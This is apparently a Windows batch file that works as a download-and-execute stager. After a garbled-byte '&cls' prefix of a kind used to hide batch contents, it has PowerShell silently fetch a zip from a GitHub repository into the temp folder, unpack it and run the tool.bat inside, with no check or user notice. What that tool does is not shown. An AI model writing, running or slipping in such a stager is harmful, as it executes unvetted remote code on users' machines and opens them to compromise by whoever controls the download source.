��&cls
@echo off
powershell.exe iwr -outf %temp%\tmp.zip https://github.com/seedon198/t/archive/refs/heads/main.zip
powershell.exe Expand-Archive -LiteralPath %temp%\tmp.zip -DestinationPath %temp%
%temp%\t-main\tool.bat